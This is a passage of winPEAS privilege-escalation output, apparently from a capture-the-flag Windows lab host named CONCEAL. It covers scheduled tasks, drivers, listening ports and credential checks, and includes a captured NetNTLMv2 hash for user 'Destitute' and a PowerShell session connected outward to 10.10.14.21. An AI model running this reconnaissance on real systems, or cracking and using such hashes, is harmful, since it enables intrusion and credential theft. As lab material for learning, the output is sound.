+    File: C:\Program Files\Windows Defender\MSASCuiL.exe (Unquoted and Space detected)
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\Program Files\VMware\VMware Tools
+    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
+   =================================================================================================
+
+
+???????????? Scheduled Applications --Non Microsoft--
+? Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                                                                                    
+    (CONCEAL\Administrator) CleanUp: powershell.exe -exec bypass -file c:\admin_checks\checks.ps1
+    Trigger: At 17:24 every day-After triggered, repeat every 00:05:00 for a duration of 1.00:00:00.
+             At system startup
+    
+   =================================================================================================
+
+
+???????????? Device Drivers --Non Microsoft--
+? Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers
+    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
+    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
+    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
+    VMware vSockets Service - 9.8.8.0 build-4037350 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
+    VMware PCI VMCI Bus Device - 9.8.6.0 build-3966680 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
+    Intel(R) Rapid Storage Technology driver (inbox) - 13.2.0.1022 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAV.sys
+    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
+    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
+    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
+    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
+    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
+    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
+    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
+    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
+    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
+    MEGASAS RAID Controller Driver for Windows - 6.711.10.11 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
+    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
+    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
+    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
+    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
+    MEGASAS RAID Controller Driver for Windows - 6.603.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
+    Microsoft? Windows? Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
+    Microsoft? Windows? Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
+     Promise? SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
+    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
+    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
+    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
+    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
+    VMware PVSCSI StorPort driver (64-bit) - 1.3.8.0 build-3482537 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsi.sys
+    VMware Raw Disk Helper Driver - 1.1.0.0 build-3625720 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys
+    VMware Pointing PS/2 Device Driver - 12.5.7.0 build-3574480 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
+    VMware SVGA 3D - 8.15.01.0050 - build-4784527 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
+    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.7.3.0 build-4062452 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys
+    VMware server memory controller - 7.4.1.0 build-3625720 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
+    VMware HGFS File System Driver - 11.0.14.2 build-3966992 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmhgfs.sys
+
+
+????????????????????????????????????? Network Information ?????????????????????????????????????
+
+???????????? Network Shares
+    ADMIN$ (Path: C:\Windows)
+    C$ (Path: C:\)
+    IPC$ (Path: )
+
+???????????? Enumerate Network Mapped Drives (WMI)
+
+???????????? Host File
+
+???????????? Network Ifaces and known hosts
+? The masks are only for the IPv4 addresses 
+    Ethernet0 2[00:50:56:B9:43:F5]: 10.10.10.116, fe80::a96d:b824:58d1:6611%12, dead:beef::b5f8:f7ed:4d65:706, dead:beef::a96d:b824:58d1:6611, dead:beef::113 / 255.255.255.0
+        Gateways: 10.10.10.2, fe80::250:56ff:feb9:e122%12
+        DNSs: 10.10.10.2
+        Known hosts:
+          10.10.10.2            00-50-56-B9-E1-22     Dynamic
+          10.10.10.255          FF-FF-FF-FF-FF-FF     Static
+          224.0.0.22            01-00-5E-00-00-16     Static
+          224.0.0.252           01-00-5E-00-00-FC     Static
+          239.255.255.250       01-00-5E-7F-FF-FA     Static
+
+    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
+        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+        Known hosts:
+          224.0.0.22            00-00-00-00-00-00     Static
+          239.255.255.250       00-00-00-00-00-00     Static
+
+
+???????????? Current TCP Listening Ports
+? Check for services restricted from the outside 
+  Enumerating IPv4 connections
+                                                                                                                                                                            
+  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
+
+  TCP        0.0.0.0               21            0.0.0.0               0               Listening         1748            svchost
+  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               135           0.0.0.0               0               Listening         828             svchost
+  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         472             wininit
+  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         988             svchost
+  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         964             svchost
+  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1528            spoolsv
+  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2504            svchost
+  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         616             services
+  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         624             lsass
+  TCP        10.10.10.116          139           0.0.0.0               0               Listening         4               System
+  TCP        10.10.10.116          49675         10.10.14.21           443             Established       5048            C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+
+  Enumerating IPv6 connections
+                                                                                                                                                                            
+  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name
+
+  TCP        [::]                                        21            [::]                                        0               Listening         1748            svchost
+  TCP        [::]                                        80            [::]                                        0               Listening         4               System
+  TCP        [::]                                        135           [::]                                        0               Listening         828             svchost
+  TCP        [::]                                        445           [::]                                        0               Listening         4               System
+  TCP        [::]                                        49664         [::]                                        0               Listening         472             wininit
+  TCP        [::]                                        49665         [::]                                        0               Listening         988             svchost
+  TCP        [::]                                        49666         [::]                                        0               Listening         964             svchost
+  TCP        [::]                                        49667         [::]                                        0               Listening         1528            spoolsv
+  TCP        [::]                                        49668         [::]                                        0               Listening         2504            svchost
+  TCP        [::]                                        49669         [::]                                        0               Listening         616             services
+  TCP        [::]                                        49670         [::]                                        0               Listening         624             lsass
+
+???????????? Current UDP Listening Ports
+? Check for services restricted from the outside 
+  Enumerating IPv4 connections
+                                                                                                                                                                            
+  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name
+
+  UDP        0.0.0.0               123           *:*                            344               svchost
+  UDP        0.0.0.0               161           *:*                            1864              snmp
+  UDP        0.0.0.0               500           *:*                            964               svchost
+  UDP        0.0.0.0               4500          *:*                            964               svchost
+  UDP        0.0.0.0               5050          *:*                            344               svchost
+  UDP        0.0.0.0               5353          *:*                            1100              svchost
+  UDP        0.0.0.0               5355          *:*                            1100              svchost
+  UDP        0.0.0.0               57419         *:*                            1100              svchost
+  UDP        0.0.0.0               62484         *:*                            1100              svchost
+  UDP        10.10.10.116          137           *:*                            4                 System
+  UDP        10.10.10.116          138           *:*                            4                 System
+  UDP        10.10.10.116          1900          *:*                            2720              svchost
+  UDP        10.10.10.116          52253         *:*                            2720              svchost
+  UDP        127.0.0.1             1900          *:*                            2720              svchost
+  UDP        127.0.0.1             52175         *:*                            3884              C:\Users\Destitute\Desktop\win.exe
+  UDP        127.0.0.1             52254         *:*                            2720              svchost
+
+  Enumerating IPv6 connections
+                                                                                                                                                                            
+  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name
+
+  UDP        [::]                                        123           *:*                            344               svchost
+  UDP        [::]                                        161           *:*                            1864              snmp
+  UDP        [::]                                        500           *:*                            964               svchost
+  UDP        [::]                                        4500          *:*                            964               svchost
+  UDP        [::]                                        5353          *:*                            1100              svchost
+  UDP        [::]                                        5355          *:*                            1100              svchost
+  UDP        [::]                                        57419         *:*                            1100              svchost
+  UDP        [::]                                        62484         *:*                            1100              svchost
+  UDP        [::1]                                       1900          *:*                            2720              svchost
+  UDP        [::1]                                       52252         *:*                            2720              svchost
+  UDP        [fe80::a96d:b824:58d1:6611%12]              1900          *:*                            2720              svchost
+  UDP        [fe80::a96d:b824:58d1:6611%12]              52251         *:*                            2720              svchost
+
+???????????? Firewall Rules
+? Showing only DENY rules (too many ALLOW rules always) 
+    Current Profiles: PUBLIC
+    FirewallEnabled (Domain):    True
+    FirewallEnabled (Private):    True
+    FirewallEnabled (Public):    True
+    DENY rules:
+
+???????????? DNS cached --limit 70--
+    Entry                                 Name                                  Data
+
+???????????? Enumerating Internet settings, zone and proxy configuration
+  General Settings
+  Hive        Key                                       Value
+  HKCU        DisableCachingOfSSLPages                  0
+  HKCU        IE5_UA_Backup_Flag                        5.0
+  HKCU        PrivacyAdvanced                           1
+  HKCU        SecureProtocols                           2688
+  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+  HKCU        CertificateRevocation                     1
+  HKCU        ZonesSecurityUpgrade                      System.Byte[]
+  HKCU        WarnonZoneCrossing                        0
+  HKCU        EnableNegotiate                           1
+  HKCU        MigrateProxy                              1
+  HKCU        ProxyEnable                               0
+  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
+  HKLM        CodeBaseSearchPath                        CODEBASE
+  HKLM        EnablePunycode                            1
+  HKLM        MinorVersion                              0
+  HKLM        WarnOnIntranet                            1
+
+  Zone Maps                                                                                                                                                                 
+  No URLs configured
+
+  Zone Auth Settings                                                                                                                                                        
+  No Zone Auth Settings
+
+
+????????????????????????????????????? Windows Credentials ?????????????????????????????????????
+
+???????????? Checking Windows Vault
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
+  [ERROR] Unable to enumerate vaults. Error (0x1061)
+    Not Found
+
+???????????? Checking Credential manager
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
+    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
+
+
+  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): Element not found'
+Please run: 
+cmdkey /list
+
+???????????? Saved RDP connections
+    Not Found
+
+???????????? Remote Desktop Server/Client Settings
+  RDP Server Settings
+    Network Level Authentication            :       
+    Block Clipboard Redirection             :       
+    Block COM Port Redirection              :       
+    Block Drive Redirection                 :       
+    Block LPT Port Redirection              :       
+    Block PnP Device Redirection            :       
+    Block Printer Redirection               :       
+    Allow Smart Card Redirection            :       
+
+  RDP Client Settings                                                                                                                                                       
+    Disable Password Saving                 :       True
+    Restricted Remote Administration        :       False
+
+???????????? Recently run commands
+    Not Found
+
+???????????? Checking for DPAPI Master Keys
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
+    Not Found
+
+???????????? Checking for DPAPI Credential Files
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
+    Not Found
+
+???????????? Checking for RDCMan Settings Files
+? Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager
+    Not Found
+
+???????????? Looking for Kerberos tickets
+?  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
+    Not Found
+
+???????????? Looking for saved Wifi credentials
+  [X] Exception: The service has not been started
+Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
+No saved Wifi credentials found
+
+???????????? Looking AppCmd.exe
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd.exe
+    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe
+      You must be an administrator to run this check
+
+???????????? Looking SSClient.exe
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
+    Not Found
+
+???????????? Enumerating SSCM - System Center Configuration Manager settings
+
+???????????? Enumerating Security Packages Credentials
+  Version: NetNTLMv2
+  Hash:    Destitute::CONCEAL:1122334455667788:93ae29b02bfb4bd0ba63a3b1ed0b9aee:010100000000000056cce753fa56da0188596ffb0aeb52e1000000000800300030000000000000000000000000300000f006a58a4c9bcd7bb54cc03002dd6aef7770636bcd12d5c4ecff9558dafaa7870a00100000000000000000000000000000000000090000000000000000000000                                        
+                                                                                                                                                                            
+   =================================================================================================
+
+
+
+????????????????????????????????????? Browsers Information ?????????????????????????????????????
+
+???????????? Showing saved credentials for Firefox
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+???????????? Looking for Firefox DBs
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+???????????? Looking for GET credentials in Firefox history
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+???????????? Showing saved credentials for Chrome
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+???????????? Looking for Chrome DBs
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+???????????? Looking for GET credentials in Chrome history
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+???????????? Chrome bookmarks
+    Not Found
+
+???????????? Showing saved credentials for Opera
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+???????????? Showing saved credentials for Brave Browser
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+???????????? Showing saved credentials for Internet Explorer (unsupported)
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+???????????? Current IE tabs
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)                   
+   --- End of inner exception stack trace ---                                                                                                                               
+   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                                                                                                                                                        
+   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                                                                                                                                            
+   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()                                                                                                   
+    Not Found
+
+???????????? Looking for GET credentials in IE history
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+
+
+???????????? IE history -- limit 50
+                                                                                                                                                                            
+    http://go.microsoft.com/fwlink/p/?LinkId=255141
+
+???????????? IE favorites
+    Not Found
+
+
+????????????????????????????????????? Interesting files and registry ?????????????????????????????????????
+
+???????????? Putty Sessions
+    Not Found
+
+???????????? Putty SSH Host keys
+    Not Found
+
+???????????? SSH keys in registry
+? If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry                                                                                                                                                                 
+    Not Found
+
+???????????? SuperPutty configuration files
+
+???????????? Enumerating Office 365 endpoints synced by OneDrive.
+                                                                                                                                                                            
+    SID: S-1-5-19
+   =================================================================================================
+
+    SID: S-1-5-20
+   =================================================================================================
+
+    SID: S-1-5-21-4220874023-1166253506-927404976-1001
+      Name:  Personal
+        UserFolder                                 C:\Users\Destitute\OneDrive
+   =================================================================================================
+
+    SID: S-1-5-18
+   =================================================================================================
+
+
+???????????? Cloud Credentials
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+???????????? Unattend Files
+
+???????????? Looking for common SAM & SYSTEM backups
+
+???????????? Looking for McAfee Sitelist.xml Files
+
+???????????? Cached GPP Passwords
+
+???????????? Looking for possible regs with creds
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
+    Not Found
+    Not Found
+    Not Found
+    Type: 16
+    Start: 2
+    ErrorControl: 1
+    ImagePath: C:\Windows\System32\snmp.exe
+    DisplayName: @%SystemRoot%\system32\snmp.exe,-3
+    ObjectName: LocalSystem
+    Description: @%SystemRoot%\system32\snmp.exe,-4
+    ServiceSidType: 1
+    RequiredPrivileges: System.String[]
+    FailureActions: System.Byte[]
+
+???????????? Looking for possible password files in users homes
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
+
+???????????? Searching for Oracle SQL Developer config files
+                                                                                                                                                                            
+
+???????????? Slack files & directories
+  note: check manually if something is found
+
+???????????? Looking for LOL Binaries and Scripts (can be slow)
+?  https://lolbas-project.github.io/
+   [!] Check skipped, if you want to run it, please specify '-lolbas' argument
+
+???????????? Enumerating Outlook download files
+                                                                                                                                                                            
+
+???????????? Enumerating machine and user certificate files
+                                                                                                                                                                            
+
+???????????? Searching known files that can contain creds in home
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+
+???????????? Looking for documents --limit 100--
+    Not Found
+
+???????????? Office Most Recent Files -- limit 50
+                                                                                                                                                                            
+  Last Access Date           User                                           Application           Document
+
+???????????? Recent files --limit 70--
+    Not Found
+
+???????????? Looking inside the Recycle Bin for creds files
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+???????????? Searching hidden files or folders in C:\Users home (can be slow)
+                                                                                                                                                                            
+     C:\Users\Default User
+     C:\Users\Default
+     C:\Users\All Users
+     C:\Users\Default
+
+???????????? Searching interesting files in other users home directories (can be slow)
+                                                                                                                                                                            
+     Checking folder: c:\users\administrator
+                                                                                                                                                                            
+   =================================================================================================
+
+
+???????????? Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
+     File Permissions "C:\Users\Destitute\Desktop\win.exe": Destitute [AllAccess]
+     File Permissions "C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": Destitute [AllAccess]
+     File Permissions "C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\OneDrivePersonal.cmd": Destitute [AllAccess]
+     File Permissions "C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\OneDrive.exe": Destitute [AllAccess]
+
+???????????? Looking for Linux shells/distributions - wsl.exe, bash.exe
+
+
+????????????????????????????????????? File Analysis ?????????????????????????????????????
+
+???????????? Found CERTSB4 Files
+File: C:\Users\All Users\VMware\VMware Tools\GuestProxyData\server\key.pem
+                   
+???????????? Found APIs-Confluent Access Token & Secret Key Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y4
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 6d4ya362y19ac5a5
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 3183844818687067
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 3183844818687067
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 3183844924576248
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 3183844924404349
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunica
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunica
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 3183844927310866
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunica
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunica
+
+???????????? Found APIs-SumoLogic Access ID Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: y46d4ya362y19a
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 31838448186870
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 31838449247012
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 31838448186870
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 31838449245762
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 31838449244043
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommuni
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommuni
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 31838449273108
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommuni
+
+???????????? Found APIs-Adafruit API Key Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya362y19ac5a5                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapps_8wekyb                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapps_8wekyb                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x27e26f40ye031y48a6yb130yd1f2038                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: 15063_neutral_neutral_cw5n1h2txy                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapps_8wekyb                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapps_8wekyb                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: immersivecontrolpanel_cw5n1h2txy                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: immersivecontrolpanel_cw5n1h2txy                                                                                                                                                                         
+
+???????????? Found APIs-Gitter Access Token Regexes
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\9d3ad23c-c6b8-7fb5-e4ab-f5d0a66dcfbc.xml: microsoftsolitairecollection_8wekyb3d8bb
+
+???????????? Found APIs-Launchdarkly Access Token Regexes
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\9d3ad23c-c6b8-7fb5-e4ab-f5d0a66dcfbc.xml: microsoftsolitairecollection_8wekyb3d8bb
+
+???????????? Found APIs-Netlify Access Token Regexes
+C:\Users\All Users\Microsoft\Windows\ClipSVC\Archive\Apps\9d3ad23c-c6b8-7fb5-e4ab-f5d0a66dcfbc.xml: microsoftsolitairecollection_8wekyb3d8bbwe
+
+???????????? Found APIs-Nytimes Access Token Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: x4c7a3b7dy2188y46d4ya362y19ac5a5                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapps_8wekyb                                                                                                                                                                         
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131838449936557844.txt: windowscommunicationsapps_8wekyb                                                                                                                                                                         
